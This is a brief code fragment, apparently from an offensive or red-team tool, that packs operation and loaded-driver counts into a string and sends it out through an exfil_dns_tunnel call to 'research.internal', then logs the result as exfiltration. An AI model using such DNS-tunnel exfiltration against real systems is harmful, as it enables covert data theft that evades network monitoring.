    let metadata = "research_chain_v2:files=" + string(operations_count) + ":drivers=" + string(array_len(loaded_drivers))
    let result = exfil_dns_tunnel("research.internal", metadata)

    if result == 0 {
        println("  [+] DNS tunnel delivery successful")
        log_operation("exfil", "dns_tunnel", "research.internal", "success")
    } else {
        println("  [!] DNS tunnel failed")
    }
}

